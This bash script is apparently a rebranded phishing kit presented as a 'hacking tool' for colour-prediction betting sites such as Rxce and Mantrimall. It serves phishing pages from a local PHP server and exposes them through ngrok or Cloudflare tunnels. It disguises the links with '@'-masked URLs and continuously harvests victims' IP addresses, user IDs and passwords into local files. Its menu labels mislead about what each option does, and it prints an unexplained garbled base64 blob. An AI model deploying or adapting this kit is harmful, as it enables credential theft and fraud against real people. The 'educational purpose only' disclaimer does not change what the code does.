#!/bin/bash

##   Amusebox 	: 	Automated Hacking Tool
##   Author 	: 	rajja8[Love is Life] 
##   Version 	: 	7.0
##   Github 	: 	https://github.com/rajja8





## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\0334m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF
		${GREEN} ____  ____  ___ __  __ _____           
		${GREEN}|  _ \|  _ \|_ _|  \/  | ____|              
		${GREEN}| |_) | |_) || || |\/| |  _|
		${GREEN}|  __/|  _ < | || |  | | |___
		${GREEN}|_|   |_| \_\___|_|  |_|_____|                                 
		${ORANGE}                                    ${RED}Version :: 7.0

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by rajja8 (Love is Life)${WHITE}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BLUE} ____  ____  ___ __  __ _____           
		${BLUE}|  _ \|  _ \|_ _|  \/  | ____|              
		${BLUE}| |_) | |_) || || |\/| |  _|
		${BLUE}|  __/|  _ < | || |  | | |___
		${BLUE}|_|   |_| \_\___|_|  |_|_____|                                 
		${RED}                                     ${RED}Version :: 7.0
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager,Please Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Rxce manually."
		{ reset_color; exit 1; }
	fi
}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Mantrimall manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing MantriMall..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Rxce..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}Love is Life ${RED}[ ${ORANGE}rajja8 ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/rajja8
		${GREEN}Version  ${RED}:  ${ORANGE}2.7

		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Love is Life,1RaY-1 ${RESETBG}

		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Choose server Contact me on telegram..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} VWebsite's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'UserID:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Checking Requirements  : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN}  ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Activated Successfully, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\MO+/vQQ/Bgkq77+9SO+/ve+/vQoBBwLvv73vv70EMDDvv70ELAIBATEPMAoGCWDvv71IAWUDBAIB
BQAwCwYJKu+/vUjvv73vv70KAQcB77+977+9Au+/vTDvv70C77+9MO+/vQHvv73vv70DAgECAgQH
Ke+/vSkwCgYJKu+/vUjvv73vv70KAQELBQAwDzEKMAsGA1UEAxMEY29lbTAeFwoyMDA1MjkxNjU0
MzRaFwo0NTA1MjMxNjU0MzRaMA8xCjALBgNVBAMTBGNvZW0w77+9ASIwCgYJKu+/vUjvv73vv70K
AQEBBQAD77+9AQ8AMO+/vQEKAu+/vQEBAO+/ve+/ve+/ve+/vToT77+9Jzca77+9Au+/ve+/vSzv
v73vv70QNu+/vWXvv73vv73vv73vv73vv717SR4nYiTvv71yfO+/vTjvv73vv708Ne+/ve+/vTjv
v73vv70577+9Wu+/ve+/vXsm77+9AArvv73vv71977+977+9WAxB77+977+977+9Bu+/vWXvv71z
77+9UmTvv73vv70AHXfvv73vv73vv73vv70cN++/vdeM77+977+9yKjKmXLvv73vv73vv73vv71j
77+9UO+/vWlp77+9JRbvv71sFW0u77+9Ou+/ve+/ve+/vTof77+97rGc77+977+9CXrvv73MnCwK
Ke+/vTQcVBJCWu+/vSU077+9eiJx77+977+9BADvv73vv73vv71077+9dSlu77+94Y+GMArvv71v
bBvvv715Te+/ve+/vWoDaO+/ve+/vU7vv70177+977+9FR7vv70i77+977+977+9T++/vTM6Ee+/
vQoI77+9Pu+/ve+/vWBv77+9HO+/vXAkIFR1BO+/vRgVbO+/vTHvv71877+977+9L1jVpO+/ve+/
vX3vv71Wce+/vUPZu++/ve+/ve+/vRzvv73vv71j77+977+9AgMBAAHvv70hMB8wHQYDVR0OBBYE
FHx+NmY7051X77+977+977+9UmQF77+977+9OSYwCgYJKu+/vUjvv73vv70KAQELBQAD77+9AQEA
77+977+9cO+/ve+/vdmg77+9Oinvv70u77+9OH1H77+9VR7vv70fByUo77+9Bu+/ve+/vULvv71y
77+977+9VUY9U3Pvv70C77+9D++/vRR877+977+977+977+9Bmnvv73CjyBu77+977+9Fe+/vSjv
v71Y77+977+977+9Pu+/ve+/vWbvv70R77+9au+/ve+/vXvvv71ZZuqjvO+/ve+/vX4Xy4ogKe+/
vX1u77+9Ejzvv73vv73vv70l77+9aHVy77+977+9L1AgSR4I77+9RO+/ve+/vUEmW27vv73vv710
e++/ve+/ve+/vXTvv73vv70KUO+/vQtU77+9HTDvv71d77+977+977+9UNOXBR/vv70RKnHvv73Z
vG3vv73vv70/77+977+977+9Xe+/vW7vv73vv71x77+977+9RO+/ve+/ve+/vRw977+9IXHvv70k
77+977+9Ou+/ve+/vTtL77+9z4fvv70vbT5k77+977+9dO+/vVLvv70kDu+/ve+/ve+/ve+/vVbv
v73vv71FQO+/vR7vv73vv70iKirvv73vv71PIu+/vW0n77+977+977+9FVzvv70fVyt277+977+9
QO+/vWd777+977+977+9YO+/vTHvv70BQjDvv70BPgIBATAXMA8xCjALBgNVBAMTBGNvZW0CBAcp
77+9KTAKBglg77+9SAFlAwQCAQUAMAoGCSrvv71I77+977+9CgEBAQUABO+/vQEAFAdvUe+/ve+/
vXfvv71QH++/vTw777+9xpwtEjFP77+977+9PgVfZO+/vTca77+977+977+977+977+9dDYFVu+/
vWnvv70+77+977+9Rlrvv719Ae+/vTtDEDEsDnTvv73vv71Bak3vv71X77+977+9Rwvvv73vv73v
v70y77+9ADBXOe+/vSJxT++/vQ4O77+9Pu+/ve+/vXFT77+9Ae+/vUvvv73vv70yEQDvv71B3IDv
v73vv700Uu+/vVtgeDrvv71oDu+/vd+1MW4277+977+9U2wfEu+/ve+/vQPvv70j77+91bLvv700
77+977+9aRcm2KsH77+9C15m77+9ThgMQu+/vQN/77+9T1/vv71C77+9XkPFt++/ve+/vS3vv718
77+9fO+/ve+/vVNO77+977+977+9JO+/ve+/vVpiQO+/vUE977+9ae+/ve+/vT0I77+977+9e++/
ve+/vWnvv70Z77+9fHzvv73vv70f77+906tzFO+/vca2Zw5S77+977+9KVbvv71477+9SUQf77+9
77+9GSjvv73vv73vv73vv714Ju+/vUw8OH/vv70=
"
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Website IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN}  Deactivated !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Rxce Failiure..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Love is Life (https://github.com/rajja8)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}


## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() { 
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Meok Failed..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} HI,there : ${GREEN}${CYAN}http://$t.me/IDFCMONEY${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Rxce    ${RED}[${CYAN}Most popular${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Mantrimall   
		${RED}[${WHITE}03${RED}]${ORANGE} Meok

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Parity
site_Parity() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} PARITY
		${RED}[${WHITE}02${RED}]${ORANGE} SAPRE
		${RED}[${WHITE}03${RED}]${ORANGE} BCONE
		${RED}[${WHITE}04${RED}]${ORANGE} EMERD

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="Parity"
			mask='https://rxce.in/#/win'
			tunnel_menu;;
		2 | 02)
			website="Mantrimalls"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		3 | 03)
			website="Rxce"
			mask='https://rxce.in/#/win'
			tunnel_menu;;
		4 | 04)
			website="Other"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_Parity; };;
	esac
}

## Bcone
site_Bcone() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} PARITY
		${RED}[${WHITE}02${RED}]${ORANGE} SAPRE
		${RED}[${WHITE}03${RED}]${ORANGE} BCONE
		${RED}[${WHITE}04${RED}]${ORANGE} EMERD

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="Bcone"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		2 | 02)
			website="Mantrimalls"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		3 | 03)
			website="Rxce"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		4 | 04)
			website="Other"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_Bcone; };;
	esac
}

## Emerd
site_Emerd() {
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} PARITY
		${RED}[${WHITE}02${RED}]${ORANGE} EMERD
		${RED}[${WHITE}03${RED}]${ORANGE} BCONE

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="Emerd"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;		
		2 | 02)
			website="Mantrimalls"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		3 | 03)
			website="Rxce"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_Emerd; };;
	esac
}

## Sapre
site_Sapre() {
	cat <<- EOF
	
		${RED}[${WHITE}01${RED}]${ORANGE} Black BackGround Page
		${RED}[${WHITE}02${RED}]${ORANGE} SAPRE Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="Sapre"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		2 | 02)
			website="Mantrimalls"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_Sapre; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Choice To Play ${RED}[${WHITE}::${RED}]${ORANGE}
   
${RED}[${WHITE}::${RED}]${ORANGE}RXCE.in        ${RED}[${WHITE}::${RED}]${ORANGE}Mantrimalls   ${RED}[${WHITE}::${RED}]${ORANGE}Meok.in
		${RED}[${WHITE}01${RED}]${ORANGE} Parity        ${RED}[${WHITE}11${RED}]${ORANGE} Parity       ${RED}[${WHITE}21${RED}]${ORANGE} Parity
		${RED}[${WHITE}02${RED}]${ORANGE} Bcone         ${RED}[${WHITE}12${RED}]${ORANGE} Bcone        ${RED}[${WHITE}22${RED}]${ORANGE} Bcone
		${RED}[${WHITE}03${RED}]${ORANGE} Emerd         ${RED}[${WHITE}13${RED}]${ORANGE} Emerd        ${RED}[${WHITE}23${RED}]${ORANGE} Emerd
		${RED}[${WHITE}04${RED}]${ORANGE} Sapre         ${RED}[${WHITE}14${RED}]${ORANGE} Sapre        ${RED}[${WHITE}24${RED}]${ORANGE} Sapre	
		${RED}[${WHITE}05${RED}]${ORANGE} Parity Number ${RED}[${WHITE}15${RED}]${ORANGE} Parity Number${RED}[${WHITE}25${RED}]${ORANGE} Parity Number		
		${RED}[${WHITE}06${RED}]${ORANGE} Bcone Number  ${RED}[${WHITE}16${RED}]${ORANGE} Bcone Number ${RED}[${WHITE}26${RED}]${ORANGE} Bcone Number
		${RED}[${WHITE}07${RED}]${ORANGE} Emerd Number  ${RED}[${WHITE}17${RED}]${ORANGE} Emerd Number ${RED}[${WHITE}27${RED}]${ORANGE} Emerd Number		
		${RED}[${WHITE}08${RED}]${ORANGE} Sapre Number  ${RED}[${WHITE}18${RED}]${ORANGE} Sapre Number ${RED}[${WHITE}28${RED}]${ORANGE} Sapre Number
		${RED}[${WHITE}09${RED}]${ORANGE} 0's           ${RED}[${WHITE}19${RED}]${ORANGE} 0's          ${RED}[${WHITE}29${RED}]${ORANGE} 0's
		${RED}[${WHITE}10${RED}]${ORANGE} 5's           ${RED}[${WHITE}20${RED}]${ORANGE} 5's          ${RED}[${WHITE}30${RED}]${ORANGE} 5's
		${RED}[${WHITE}31${RED}]${ORANGE} Voilets       ${RED}[${WHITE}32${RED}]${ORANGE} Voilets      ${RED}[${WHITE}33${RED}]${ORANGE} Voilets

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_Parity;;
		2 | 02)
			site_Bcone;;
		3 | 03)
			site_Emerd;;
		4 | 04)
			website="Sapre"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		5 | 05)
			website="Parity Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		6 | 06)
			website="Bcone Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		7 | 07)
			website="Emerd Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		8 | 08)
			website="Sapre Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		9 | 09)
			website="0's"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		10)
			website="5's"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		11)
			website="Voilets"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		12)
			website="Parity"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		13)
			website="Bcone"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		14)
			website="Emerd"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		15)
			website="Sapre"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		16)
			website="Parity Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		17)
			website="Bcone Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		18)
			website="Emerd Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		19)
			website="Sapre Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		20)
			website="0's"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		21)
			website="5's"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		22)
			website="Voilets"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		23)
			website="Parity"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		24)
			website="Bcone"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		25)
			website="Emerd"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		26)
			website="Sapre"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		27)
			website="Parity Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		28)
			website="Bcone Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="Sapre Number"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		31)
			website="0's"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		32)
			website="5's"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		33)
			website="Voilets"
			mask='https://t.me/@Rxcehacknewupdate'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
main_menu
